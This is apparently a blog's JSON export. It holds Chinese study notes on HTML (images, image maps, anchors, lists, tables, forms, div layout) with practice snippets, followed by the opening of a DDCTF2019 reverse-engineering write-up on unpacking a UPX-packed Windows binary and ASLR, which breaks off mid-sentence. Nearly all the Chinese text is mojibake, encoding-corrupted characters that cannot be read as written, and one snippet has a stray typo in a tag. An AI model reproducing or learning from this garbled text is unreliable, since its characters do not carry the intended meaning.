&lt;p&gt;å¤å¤©çš„å±±ä¹Ÿæ˜¯ç»¿è‰²çš„ï¼Œé‚£ç»¿è‰²æµ“æµ“çš„ï¼Œä¸€ç‰‡ç‰‡æ ‘å¶ï¼Œä¸ç®¡æ˜¯å¤§çš„è¿˜æ˜¯å°çš„ï¼Œéƒ½åƒè¢«ç»¿æ²¹å½©æ¶‚è¿‡ï¼Œè¿é›¨ç‚¹è½ä¸Šå»ï¼Œéƒ½ç»™æŸ“ç»¿äº†ã€‚&lt;/p&gt; &lt;p&gt;ç§‹å¤©çš„å±±ä¸å†æ˜¯ä¸€ç§é¢œè‰²äº†ã€‚ä¸‹è¿‡ä¸€åœºç§‹éœœæœ‰çš„æ ‘æ—å˜æˆäº†é‡‘é»„è‰²â–¡å¥½åƒæ‰€æœ‰çš„é˜³å…‰éƒ½é›†ä¸­åˆ°é‚£å„¿å»äº†æœ‰çš„æ ‘æ—å˜æˆäº†æé»„è‰²è¿œè¿œæœ›å»ï¼Œå°±åƒæå¤´æŒ‚æ»¡äº†ç†Ÿé€çš„æå’Œæ¢¨ï¼›æœ‰çš„æ ‘æ—å˜æˆäº†ç«çº¢è‰²ï¼Œé£ä¸€å¹ï¼Œæ ‘æ—è·³èµ·èˆæ¥ï¼Œå°±åƒä¸€ç°‡ç°‡ç«è‹—åœ¨è·³è·ƒï¼›è¿˜æœ‰çš„æ ‘æ—å˜å¾—ç´«çº¢ç´«çº¢ï¼Œè·Ÿå‰§åœºé‡Œçš„ç´«ç»’å¹•å¸ƒçš„é¢œè‰²ä¸€æ ·ã€‚åªæœ‰æ¾æŸä¸æ€•ç§‹éœœï¼Œé’ˆä¸€æ ·çš„å¶å­è¿˜æ˜¯é‚£ä¹ˆç¿ ç»¿ã€‚&lt;/p&gt; &lt;p&gt;ç§‹å¤©çš„å±±ä¸€ç‰‡é‡‘é»„ï¼Œä¸€ç‰‡ç«çº¢ï¼Œä¸€ç‰‡ç¿ ç»¿â€¦â€¦äººä»¬ç»™è¿™äº”é¢œå…­è‰²çš„å±±èµ·äº†ä¸ªå¥½å¬çš„åå­—ï¼Œå«â€œ&lt;strong&gt;&lt;em&gt; &lt;del&gt;äº”èŠ±å±±&lt;/del&gt;&lt;/em&gt;&lt;/strong&gt;â€ã€‚&lt;/p&gt; &lt;!-- å‡ ä¸ªæ ‡ç­¾çš„åµŒå¥— --&gt; &lt;strong&gt;åŠ ç²—&lt;/strong&gt; &lt;em&gt;æ–œä½“&lt;/em&gt; &lt;del&gt;åˆ é™¤æ–‡å­—&lt;/del&gt;&lt;!-- &lt;span&gt;é…åˆcss&lt;/span&gt; --&gt; &lt;/body&gt; &lt;/html&gt; æ•ˆæœï¼š HTML å›¾åƒ ==HTML å›¾åƒ-== ï¼š æ ‡ç­¾ï¼ˆ &lt;img&gt;ï¼‰æ˜¯ç©ºæ ‡ç­¾ï¼Œæ„æ€æ˜¯è¯´ï¼Œå®ƒåªåŒ…å«å±æ€§ï¼Œå¹¶ä¸”æ²¡æœ‰é—­åˆæ ‡ç­¾ã€‚ æºå±æ€§ï¼ˆ&lt;src&gt;ï¼‰æ˜¯å›¾åƒçš„ URL åœ°å€ã€‚åˆ†ä¸ºæœ¬åœ°å’Œç½‘ä¸Šï¼Œæœ¬åœ°å›¾ç‰‡å†™è·¯å¾„çš„æ—¶å€™æ³¨æ„ç»å¯¹è·¯å¾„å’Œç›¸å¯¹è·¯å¾„ï¼ˆå¯ä»¥ç”¨../æ¥è¿”å› ä¸€çº§ç›®å½•ï¼Œè¿”å›å‡ çº§ç›®å½•å°±å†™å‡ ä¸ªå®ƒå°±è¡Œ)ã€‚ Altå±æ€§:alt å±æ€§ç”¨æ¥ä¸ºå›¾åƒå®šä¹‰ä¸€ä¸²é¢„å¤‡çš„å¯æ›¿æ¢çš„æ–‡æœ¬,åœ¨æµè§ˆå™¨æ— æ³•è½½å…¥å›¾åƒæ—¶,å‘Šç”¨æˆ·å›¾ç‰‡çš„ä¿¡æ¯ã€‚==æœç´¢å¼•æ“ä¹Ÿæ˜¯é€šè¿‡æ­¤æè¿°æ¥æ”¶é›†å›¾ç‰‡çš„==. é«˜åº¦ä¸å®½åº¦:heightï¼ˆé«˜åº¦ï¼‰ ä¸ widthï¼ˆå®½åº¦ï¼‰å±æ€§ç”¨äºè®¾ç½®å›¾åƒçš„é«˜åº¦ä¸å®½åº¦ã€‚å±æ€§å€¼é»˜è®¤å•ä½ä¸ºåƒç´ pxã€‚ ç»ƒä¹ ï¼š &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;å›¾ç‰‡&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;img src=\"1.png\" alt=\"chumençš„qqå›¾åƒ\" title=\"chumençš„qqå›¾åƒ\"&gt; &lt;/body&gt; &lt;/html&gt; å›¾ç‰‡çš„æ˜ å°„ç›®æ ‡æ˜¯ä¸ºäº†åœ¨ä¸€å¼ å›¾ç‰‡ä¸Šçš„æŸä¸ªä½ç½®ç‚¹å‡»åæ‰å¯ä»¥å®ç°æŸä¸ªåŠŸèƒ½ã€‚ è¿™éœ€è¦ç”¨åˆ°usemap=&quot;#diyname&quot; ç„¶åç”¨&lt;map name=&quot;diyname&quot;&gt;&lt;/map&gt;æ ‡ç­¾æ¥å¯¹åº”ã€‚ æ ¸å¿ƒä»£ç ï¼š` &lt;area shape=\"\" coords=\"\" href=\"\"&gt; \\\\` shapeæ˜¯é€‰æ‹©çš„å½¢çŠ¶ï¼Œcoordsæ˜¯åæ ‡ï¼Œåæ ‡ç¡®å®šæ¨èç”¨qqçš„æˆªå›¾åŠŸèƒ½é‚£é‡Œæ¥ç¡®å®šï¼Œæ¯”å¦‚ï¼š é‚£è¿™ä¸ªå½©è‰²ç®­å¤´æŒ‡çš„ä½ç½®å°±æ˜¯åœ¨è¿™ä¸ªå›¾åƒçš„ï¼ˆ233,456ï¼‰ä½ç½®ã€‚ ç»ƒä¹ ï¼š &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;å›¾ç‰‡çš„æ˜ å°„&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;img src=\"1.png\" alt=\"\" usemap=\"#1map\"&gt; &lt;map name=\"1map\"&gt; &lt;area shape=\"circle\" coords=\"300,255,50\" target=\"_blank\" href=\"http://www.baidu.com\"&gt; &lt;/map&gt; &lt;/body&gt; &lt;/html&gt; æ•ˆæœï¼š HTML è¶…é“¾æ¥è¶…é“¾æ¥å¯ä»¥æ˜¯ä¸€ä¸ªå­—ï¼Œä¸€ä¸ªè¯ï¼Œæˆ–è€…ä¸€ç»„è¯ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€å¹…å›¾åƒï¼Œæ‚¨å¯ä»¥ç‚¹å‡»è¿™äº›å†…å®¹æ¥è·³è½¬åˆ°æ–°çš„æ–‡æ¡£æˆ–è€…å½“å‰æ–‡æ¡£ä¸­çš„æŸä¸ªéƒ¨åˆ†ã€‚ä½¿ç”¨æ ‡ç­¾ &lt;a&gt;æ¥è®¾ç½®è¶…æ–‡æœ¬é“¾æ¥ã€‚ HTML é“¾æ¥è¯­æ³•:&lt;a href=&quot;url&quot;&gt;é“¾æ¥æ–‡æœ¬&lt;/a&gt; ,href å±æ€§æè¿°äº†é“¾æ¥çš„ç›®æ ‡ã€‚ target å±æ€§ :target=&quot;_blank&quot;æ•ˆæœå°±æ˜¯åœ¨æ–°çª—å£ï¼ˆç©ºç™½ç•Œé¢ï¼‰åšå‡ºæ¥ ã€‚ id å±æ€§:idå±æ€§å¯ç”¨äºåˆ›å»ºåœ¨ä¸€ä¸ªHTMLæ–‡æ¡£ä¹¦ç­¾æ ‡è®°,åœ¨HTMLæ–‡æ¡£ä¸­æ’å…¥ID: &lt;a id=&quot;tips&quot;&gt;æœ‰ç”¨çš„æç¤ºéƒ¨åˆ†&lt;/a&gt; åœ¨HTMLæ–‡æ¡£ä¸­åˆ›å»ºä¸€ä¸ªé“¾æ¥åˆ°â€æœ‰ç”¨çš„æç¤ºéƒ¨åˆ†(id=â€tipsâ€ï¼‰â€: &lt;a href=&quot;#tips&quot;&gt;è®¿é—®æœ‰ç”¨çš„æç¤ºéƒ¨åˆ†&lt;/a&gt; è§£é‡ŠåŠ è¡¥å……ï¼šID å±æ€§åå­—åªèƒ½æœ‰ä¸€ä¸ªä¸å¯é‡å¤ï¼Œä¸”å¿…é¡»ä»¥==å­—æ¯==å¼€å¤´ï¼Œå¯ä»¥åœ¨ä¸€ä¸ªç•Œé¢çš„ä»»ä½•ä½ç½®çš„å†…å®¹è¿›è¡Œè®¾ç½®IDï¼Œåœ¨è®¾ç½®å®Œåï¼Œï¼ˆ&lt;a href=&quot;# &quot;&gt;ï¼‰ï¼Œåœ¨==â€œ#â€==ååŠ å…¥idçš„åç§°å³å¯è·³è½¬åˆ°ä½ è®¾ç½®IDçš„å†…å®¹å¤„ã€‚ &lt;a name=&quot;end&quot;&gt;&lt;/a&gt; &lt;a href=&quot;#end&quot;&gt;end&lt;/a&gt; åšé”šç‚¹æ—¶ï¼Œæ›¿æ¢idçš„æ–¹æ³•ï¼Œä½œç”¨å¯ä»¥å®ç°ä¸€æ ·ï¼idä¸å¥½ç”¨æ—¶ç”¨è¿™ä¸ª ç»ƒä¹ ï¼šï¼ˆä¸ºäº†æ–¹ä¾¿é˜…è¯»ï¼Œçœç•¥äº†å¾ˆå¤šçš„&lt;br&gt;.ï¼‰ &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;è¶…çº§é“¾æ¥&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href=\"http://www.mi.com\" target=\"_blank\"&gt;&lt;img src=\"1.png\"&gt;&lt;/a&gt; &lt;!-- /*ä¹¦ç­¾æ ‡è®°ï¼šé”šç‚¹*/ --&gt; &lt;a href=\"#end\"&gt;end&lt;/a&gt; &lt;br id=\"aa\"&gt; &lt;br&gt; &lt;br id=\"miao\"&gt; &lt;br&gt; &lt;br&gt; &lt;br&gt; &lt;a name=\"miao\"&gt;&lt;/a&gt; &lt;br&gt; &lt;br&gt; &lt;br&gt; &lt;br&gt; &lt;a name=\"end\"&gt;&lt;/a&gt; &lt;a href=\"#miao\"&gt;miao&lt;/a&gt; &lt;/body&gt; &lt;/html&gt; HTML åˆ—è¡¨ HTMLæ— åºåˆ—è¡¨ï¼š&lt;ul&gt;ä¸ &lt;li&gt;å…¶ç‚¹çš„æ ·å¼(åœ†åœˆï¼Œåœ†å¿ƒï¼Œæ­£æ–¹å½¢ï¼‰ç”¨cssæ¥æ§åˆ¶&lt;ul style=&quot;list-style-type:circle&quot;&gt; HTML æœ‰åºåˆ—è¡¨ &lt;ol&gt;ä¸&lt;li&gt; ç”¨æ³•å’Œæ— åºç›¸ä¼¼ï¼Œä¸”æœ‰åºä¸æ— åºä¹‹é—´å¯ä»¥äº’ç›¸åµŒå¥—ï¼ŒåµŒå¥—è¿‡ç¨‹ä¸­ç‚¹çš„å½¢çŠ¶ä¹Ÿä¼šè‡ªåŠ¨å˜åŒ–ã€‚ HTML è‡ªå®šä¹‰åˆ—è¡¨ï¼šè¿™ä¸ªæ˜¯æ¯”è¾ƒå¸¸ç”¨çš„ï¼Œè‡ªå®šä¹‰åˆ—è¡¨ä»¥&lt;dl&gt; æ ‡ç­¾å¼€å§‹ã€‚æ¯ä¸ªè‡ªå®šä¹‰åˆ—è¡¨é¡¹ä»¥ &lt;dt&gt; å¼€å§‹ã€‚æ¯ä¸ªè‡ªå®šä¹‰åˆ—è¡¨é¡¹çš„å®šä¹‰ä»¥ &lt;dd&gt;å¼€å§‹ã€‚å…¶ä¸ä»…ä»…æ˜¯ä¸€åˆ—é¡¹ç›®ï¼Œè€Œæ˜¯é¡¹ç›®åŠå…¶æ³¨é‡Šçš„ç»„åˆã€‚ &lt;dl&gt; &lt;dt&gt;Coffee&lt;/dt&gt; &lt;!-- åˆ—è¡¨æ ‡é¢˜ --&gt; &lt;dd&gt;- black hot drink&lt;/dd&gt; &lt;!-- å…¶å†…å®¹ --&gt; &lt;dt&gt;Milk&lt;/dt&gt; &lt;dd&gt;- white cold drink&lt;/dd&gt; &lt;/dl&gt; ç»ƒä¹ ï¼š &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;åˆ—è¡¨&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;ul style=\"list-style-type:circle\"&gt; &lt;li&gt;æ— åºåˆ—è¡¨1&lt;/li&gt; &lt;li&gt;æ— åºåˆ—è¡¨2&lt;/li&gt; &lt;li&gt;æ— åºåˆ—è¡¨3&lt;/li&gt; &lt;li&gt;æ— åºåˆ—è¡¨4&lt;/li&gt; &lt;/ul&gt; &lt;ol&gt; &lt;li&gt;æœ‰åºåˆ—è¡¨1&lt;/li&gt; &lt;li&gt;æœ‰åºåˆ—è¡¨2&lt;/li&gt; &lt;li&gt;æœ‰åºåˆ—è¡¨3&lt;/li&gt; &lt;li&gt;æœ‰åºåˆ—è¡¨4&lt;/li&gt; &lt;/ol&gt; &lt;dl&gt; &lt;dt&gt;æ ‡é¢˜1&lt;/dt&gt; &lt;dd&gt;è‡ªå®šä¹‰åˆ—è¡¨1&lt;/dd&gt; &lt;dd&gt;è‡ªå®šä¹‰åˆ—è¡¨2&lt;/dd&gt; &lt;dd&gt;è‡ªå®šä¹‰åˆ—è¡¨3&lt;/dd&gt; &lt;dd&gt;è‡ªå®šä¹‰åˆ—è¡¨4&lt;/dd&gt; &lt;dt&gt;æ ‡é¢˜2&lt;/dt&gt; &lt;dd&gt;è‡ªå®šä¹‰åˆ—è¡¨1&lt;/dd&gt; &lt;dd&gt;è‡ªå®šä¹‰åˆ—è¡¨2&lt;/dd&gt; &lt;dd&gt;è‡ªå®šä¹‰åˆ—è¡¨3&lt;/dd&gt; &lt;dd&gt;è‡ªå®šä¹‰åˆ—è¡¨4&lt;/dd&gt; &lt;/dl&gt; &lt;/body&gt; &lt;/html&gt; æ•ˆæœï¼š HTMLè¡¨æ ¼ HTML è¡¨æ ¼ï¼šè¡¨æ ¼ç”± &lt;table&gt;æ ‡ç­¾æ¥å®šä¹‰ã€‚æ¯ä¸ªè¡¨æ ¼å‡æœ‰è‹¥å¹²==è¡Œ==ï¼ˆç”± &lt;tr&gt; æ ‡ç­¾å®šä¹‰ï¼‰ï¼Œæ¯è¡Œè¢«åˆ†å‰²ä¸ºè‹¥å¹²==å•å…ƒæ ¼==ï¼ˆç”± &lt;td&gt; æ ‡ç­¾å®šä¹‰ï¼‰ã€‚å­—æ¯ td æŒ‡è¡¨æ ¼æ•°æ®ï¼ˆtable dataï¼‰ï¼Œå³æ•°æ®å•å…ƒæ ¼çš„å†…å®¹ã€‚æ•°æ®å•å…ƒæ ¼å¯ä»¥åŒ…å«æ–‡æœ¬ã€å›¾ç‰‡ã€åˆ—è¡¨ã€æ®µè½ã€è¡¨å•ã€æ°´å¹³çº¿ã€è¡¨æ ¼ç­‰ç­‰ã€‚è¿™ä¸ªæœ‰åˆ©äºå¤šæ ·åŒ–ï¼Œåœ¨åˆ†æ¸…æ ç›®ååœ¨tdé‡Œæ”¾å†…å®¹å°±okã€‚ HTML è¾¹æ¡†å±æ€§:&lt;table border=&quot;1&quot;&gt;ä¼šå‡ºç°è¡¨æ¡†ã€‚ HTML è¡¨æ ¼è¡¨å¤´:è¡¨æ ¼çš„è¡¨å¤´ä½¿ç”¨ &lt;th&gt; æ ‡ç­¾è¿›è¡Œå®šä¹‰ã€‚&lt;th&gt;æ ‡ç­¾ä¸&lt;td&gt;æ ‡ç­¾ç”¨æ³•ç›¸ä¼¼åªæ˜¯æ˜¾ç¤ºçš„æ•ˆæœä¸åŒï¼Œä¼šæœ‰ç²—ä½“å±…ä¸­çš„æ•ˆæœï¼› HTMLè¡¨æ ¼åˆå¹¶ï¼šç”¨ colspanï¼š æ¨ªå‘è¡Œ rowspan ï¼šç«–çºµè¡Œã€‚ HTMLè¡¨æ ¼å•å…ƒæ ¼è¾¹è·çš„è®¾ç½®ï¼šç±»ä¼¼ è®¾ç½®è¾¹æ¡† ç›´æ¥åœ¨tableæ ‡ç­¾é‡Œæ”¾å…¥cellpadding=â€œè‡ªå®šä¹‰çš„æ•°å­—â€ï¼Œå°±è®¾ç½®å¥½äº†ã€‚ ç»ƒä¹ ï¼š &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;è¡¨æ ¼&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;th&gt;éƒ¨é—¨&lt;/th&gt; &lt;th&gt;å§“å&lt;/th&gt; &lt;th&gt;æ€§åˆ«&lt;/th&gt; &lt;th&gt;å·¥èµ„&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td rowspan=\"3\"&gt;å¼€å‘ç»„&lt;/td&gt; &lt;td&gt;å°æ˜&lt;/td&gt; &lt;td&gt;ç”·&lt;/td&gt; &lt;td&gt;1w&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;å°ç™½&lt;/td&gt; &lt;td&gt;å¥³&lt;/td&gt; &lt;td&gt;1w&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td colspan=\"2\"&gt;å·¥èµ„åˆè®¡&lt;/td&gt; &lt;td&gt;2w&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/body&gt; &lt;/html&gt; æ•ˆæœï¼š HTML è¡¨å•è¡¨å•æ˜¯ä¸€ä¸ªåŒ…å«è¡¨å•å…ƒç´ çš„åŒºåŸŸã€‚è¡¨å•å…ƒç´ æ˜¯å…è®¸ç”¨æˆ·åœ¨è¡¨å•ä¸­è¾“å…¥å†…å®¹,æ¯”å¦‚ï¼šæ–‡æœ¬åŸŸ(textarea)ã€ä¸‹æ‹‰åˆ—è¡¨ã€å•é€‰æ¡†(radio-buttons)ã€å¤é€‰æ¡†(checkboxes)ç­‰ç­‰ã€‚ `inputå…ƒç´  \\\\\\\\\\` HTML è¡¨å• - è¾“å…¥å…ƒç´ è¾“å…¥æ ‡ç­¾&lt;input&gt;ã€‚ æ–‡æœ¬åŸŸæ–‡æœ¬åŸŸé€šè¿‡&lt;input type=&quot;text&quot;&gt; æ ‡ç­¾æ¥è®¾å®šï¼Œå½“ç”¨æˆ·è¦åœ¨è¡¨å•ä¸­é”®å…¥å­—æ¯ã€æ•°å­—ç­‰å†…å®¹æ—¶ï¼Œå°±ä¼šç”¨åˆ°æ–‡æœ¬åŸŸã€‚ `First name: Last name: \\\\\\\\\\` åœ¨å¤§å¤šæ•°æµè§ˆå™¨ä¸­ï¼Œæ–‡æœ¬åŸŸçš„ç¼ºçœå®½åº¦æ˜¯20ä¸ªå­—ç¬¦ã€‚ å¯†ç å­—æ®µ&lt;input type=&quot;password&quot;&gt; æ¥å®šä¹‰ &lt;form&gt; Password: &lt;input type=\"password\" name=\"pwd\"&gt; &lt;/form&gt; å•é€‰æŒ‰é’®&lt;input type=&quot;radio&quot;&gt; æ ‡ç­¾å®šä¹‰äº†è¡¨å•å•é€‰æ¡†é€‰é¡¹ã€‚ &lt;form&gt; &lt;input type=\"radio\" name=\"sex\" value=\"male\"&gt;Male&lt;br&gt; &lt;input type=\"radio\" name=\"sex\" value=\"female\"&gt;Female &lt;/form&gt; Name æ˜¯å¯ä»¥è¿›è¡Œ==åˆ†ç»„==ã€‚æƒ³è¦æœ‰æ•ˆæœ valueä¹Ÿå°‘ä¸äº†ã€‚ å¤é€‰æ¡†&lt;input type=&quot;checkbox&quot;&gt;å®šä¹‰äº†å¤é€‰æ¡†. ç”¨æˆ·éœ€è¦ä»è‹¥å¹²ç»™å®šçš„é€‰æ‹©ä¸­é€‰å–ä¸€ä¸ªæˆ–è‹¥å¹²é€‰é¡¹ã€‚ &lt;form&gt; &lt;input type=\"checkbox\" name=\"vehicle\" value=\"Bike\"&gt;I have a bike&lt;br&gt; &lt;input type=\"checkbox\" name=\"vehicle\" value=\"Car\"&gt;I have a car &lt;/form&gt; ç±»ä¼¼å•é€‰ä¸‰è€…ç¼ºä¸€ä¸å¯ã€‚ æäº¤æŒ‰é’®&lt;input type=&quot;submit&quot;&gt;å®šä¹‰äº†æäº¤æŒ‰é’®. &lt;form name=\"input\" action=\"\" method=\"\"&gt; Username: &lt;input type=\"text\" name=\"user\"&gt; &lt;input type=\"submit\" value=\"Submit\"&gt; &lt;/form&gt; ==valueï¼šæäº¤æ•°æ®åˆ°æœåŠ¡å™¨çš„å€¼ï¼ˆåå°ç¨‹åºPHPä½¿ç”¨ï¼‰å†™æŒ‰é’®æ—¶ä¸€å®šè¦å†™ä¸Šã€‚ nameï¼šä¸ºæ§ä»¶å‘½åï¼Œä»¥å¤‡åå°ç¨‹åº ASPã€PHP ä½¿ç”¨== ç»ƒä¹ ï¼š&lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;è¡¨å•&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=\"\"&gt; &lt;!-- action ä¸­å€¼ä¸ºæäº¤çš„ç½‘é¡µ --&gt;&lt;!-- é»˜è®¤ä¸ºget --&gt; admin&lt;input type=\"text\" name=\"user\"&gt; password&lt;input type=\"password\" name=\"password\"&gt; &lt;br&gt; &lt;input type=\"radio\" name=\"sex1\" value=\"male\"&gt;ç”· &lt;br&gt; &lt;input type=\"radio\" name=\"sex1\" value=\"female\"&gt;å¥³ &lt;input type=\"radio\" name=\"sex\"&gt;ä¸­æ€§&lt;!-- nameä¸­å€¼ä¸€æ ·é‚£ä¹ˆå…¶åˆ†ç»„å°±ä¸€æ · --&gt; &lt;!-- &lt;input type=\"radio\" name=\"sex\"&gt;ç”· &lt;input type=\"radio\" name=\"sex\"&gt;å¥³ &lt;input type=\"radio\" name=\"sex\"&gt;ä¸­æ€§ --&gt; &lt;br&gt; &lt;!-- å…´è¶£å¤é€‰æ¡† --&gt; &lt;input type=\"checkbox\" name=\"xq\" value=\"kanshu\"&gt; çœ‹ä¹¦ &lt;input type=\"checkbox\" name=\"xq\" value=\"xuexi\"&gt; å­¦ä¹  &lt;input type=\"checkbox\" name=\"xq\" value=\"music\"&gt; å¬æ­Œ &lt;br&gt; åŸå¸‚&lt;select name=\"city\"&gt; &lt;option value=\"shanghai\"&gt;ä¸Šæµ·&lt;/option&gt; &lt;option value=\"beijing\"&gt;åŒ—äº¬&lt;/option&gt; &lt;/select&gt; &lt;input type=\"submit\" name=\"\"&gt;&lt;br&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; æ•ˆæœï¼š HTMLå¸ƒå±€HTML å¸ƒå±€ - ä½¿ç”¨&lt;div&gt; å…ƒç´ . å¯ä»¥å…ˆåˆ†ä¸ºå¤´éƒ¨div åº•éƒ¨div å’Œä¸­é—´çš„divï¼Œç„¶åé€æ­¥æ·»åŠ æ ‡ç­¾è¿›è¡Œæ‰©å……ï¼Œç”¨cssæ¥è®¾ç½®æ ·å¼ã€‚ è¿™ä¸­é—´éœ€è¦ç”¨åˆ°floatï¼šleftç­‰ æ¥æ§åˆ¶ä¸€ä¸ªdivä¸­å¥—ç”¨çš„divçš„ä½ç½®ã€‚ HTMLä¸­&lt;div&gt;å…ƒç´ æ˜¯å—çº§å…ƒç´ ï¼Œå®ƒå¯ç”¨äºç»„åˆå…¶ä»– HTMLå…ƒç´ çš„å®¹å™¨ã€‚ &lt;div&gt; å…ƒç´ çš„å¦ä¸€ä¸ªå¸¸è§çš„ç”¨é€”æ˜¯æ–‡æ¡£å¸ƒå±€ã€‚&lt;div&gt;å…ƒç´ ç»å¸¸ä¸ CSS ä¸€èµ·ä½¿ç”¨ï¼Œç”¨æ¥å¸ƒå±€ç½‘é¡µã€‚ &lt;div&gt; å…ƒç´ æ²¡æœ‰ç‰¹å®šçš„å«ä¹‰ã€‚ ç»ƒä¹ ï¼š &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;å¸ƒå±€&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- &lt;div style=\"background: yellow; width: 50px;\"&gt; è¿™æ˜¯ä¸ªdivè¿™æ˜¯ä¸ªdivè¿™æ˜¯ä¸ªdivè¿™æ˜¯ä¸ªdiv &lt;/div&gt; --&gt; &lt;div style=\"background: yellow;height: 100px;\"&gt;å¯¼èˆª&lt;/div&gt; &lt;div style=\"background: green;width: 20%; float: left; height: 300px;\"&gt;èœå•&lt;/div&gt; &lt;di+v style=\"background: red;width: 80%; float: left;height: 300px;\"&gt;å†…å®¹&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; HTMLåµŒå¥—è§„åˆ™å…ƒç´ åˆ†ç±»ï¼š æ–‡å­—ç±»å—å…ƒç´ ï¼šp h1~h6 å®¹å™¨ç±»å—å…ƒç´ ï¼šdiv table tr td th form ul li ol dl dt dd è¡Œå…ƒç´ :ä¸ç‹¬ç«‹æˆè¡Œï¼Œä¸å¯ä»¥ å†…å®¹å†³å®ša img input strong em del span ç‰¹æ®Šå­—ç¬¦:br è§„åˆ™ å—å…ƒç´ å¯ä»¥åµŒå¥—è¡Œå…ƒç´  &lt;div&gt;è¿™æ˜¯div &lt;a href=&quot;&quot;&gt;è¿™æ˜¯a&lt;/a&gt; &lt;/div&gt; è¡Œå…ƒç´ å¯ä»¥åµŒå¥—è¡Œå…ƒç´  &lt;a href=&quot;&quot;&gt;è¿™æ˜¯ä¸ª&lt;strongã€‰ a&lt;/strong&gt; è¡Œå…ƒç´ ä¸å¯ä»¥åµŒå¥—å—å…ƒç´  æ–‡å­—ç±»æŠ‰å…ƒç´ ä¸å¯ä»¥åµŒå¥—å—å…ƒç´  å®¹å™¨ç±»æŠ‰å…ƒç´ å¯ä»¥åµŒå¥—å—å…ƒç´ ","categories":[],"tags":[{"name":"å­¦ä¹ è®°å½•","slug":"å­¦ä¹ è®°å½•","permalink":"http://chumen77.xyz/tags/å­¦ä¹ è®°å½•/"}]},{"title":"DDCTF2019-RE-Windows Reverse","slug":"DDCTF2019-RE-Windows Reverse","date":"2019-11-17T09:38:51.000Z","updated":"2020-02-28T07:52:52.000Z","comments":true,"path":"2019/11/17/DDCTF2019-RE-Windows Reverse/","link":"","permalink":"http://chumen77.xyz/2019/11/17/DDCTF2019-RE-Windows Reverse/","excerpt":"","text":"DDCTF2019-RE-Windows Reverseå‰è¨€åœ¨ä¸€ä¸ªè®ºå›é‡Œå‘ç°DDCTFè¿™ä¸¤é“é€†å‘é¢˜ä¸æ˜¯å¾ˆéš¾ï¼Œå°±æƒ³ç€åšä¸€ä¸‹ç»ƒç»ƒæ‰‹ã€‚å› ä¸ºæœ€è¿‘åšçš„éƒ½æ˜¯æ¯”è¾ƒè€çš„é¢˜ç›®ï¼Œè¿™ä¸ªè¿˜ç®—æ–°ä¸€ç‚¹çš„ã€‚é¢˜ç›®ä¸‹è½½ï¼šreverse1_final.zipreverse2_final.exe.zip reverse1_final.exeæŸ¥å£³å¯ä»¥çœ‹å‡ºæ˜¯UPXå£³ã€‚å¦å¤–ï¼š /Volumes/data/ctfé€†å‘é¢˜ç›®/2019ddctf î‚° file reverse1_final.exe reverse1_final.exe: PE32 executable (console) Intel 80386, for MS Windows, UPX compressedåœ¨macç»ˆç«¯ä¹Ÿå¯ä»¥ç”¨fileå‘½ä»¤æŸ¥å‡ºã€‚ è„±å£³ç›´æ¥åœ¨ç»ˆç«¯UPX -d è„±äº†å°±å¯ä»¥äº†ã€‚ è¿è¡Œå‘ç°ç›´æ¥æ˜¯è¿è¡Œä¸äº†çš„ï¼Œæƒ³åˆ°æ˜¯ä¸æ˜¯å› ä¸ºè„±å£³åè¿™ä¸ªéœ€è¦èµ„æºä¿®å¤ï¼Œå„ç§æ“ä½œä¿®å¤åå‘ç°è¿˜æ˜¯ä¸å¯ä»¥ã€‚æœ€åæŸ¥è¯¢ä»–äººwpå‘ç°è¿™ä¸ªç¨‹åºå¼€å¯äº†ASLRã€‚éœ€è¦peå·¥å…·å»å…³é—­è¿™ä¸ªç¨‹åºçš„ASLRã€‚ç„¶åæˆ‘å°±å»æŸ¥äº†ASLRæ˜¯æ€ä¹ˆå…³é—­çš„ï¼Œä¸”å…¶æ˜¯ä»€ä¹ˆä¸œè¥¿ã€‚ ASLRASLRé€šè¿‡éšæœºæ”¾ç½®è¿›ç¨‹å…³é”®æ•°æ®åŒºåŸŸçš„åœ°å€ç©ºé—´æ¥é˜²æ­¢æ”»å‡»è€…èƒ½å¯é åœ°è·³è½¬åˆ°å†…å­˜çš„ç‰¹å®šä½ç½®æ¥åˆ©ç”¨å‡½æ•°ã€‚ç°ä»£æ“ä½œç³»ç»Ÿä¸€èˆ¬éƒ½åŠ è®¾è¿™ä¸€æœºåˆ¶ï¼Œä»¥é˜²èŒƒæ¶æ„ç¨‹åºå¯¹å·²çŸ¥åœ°å€è¿›è¡ŒReturn-to-libcæ”»å‡»ã€‚ â€“ç™¾åº¦ç™¾ç§‘éšååˆæŸ¥è¯¢åˆ°win7ä»¥åçš„windowsç³»ç»Ÿéƒ½æ˜¯æœ‰è¿™ä¸ªæœºåˆ¶çš„ï¼Œä½†å› 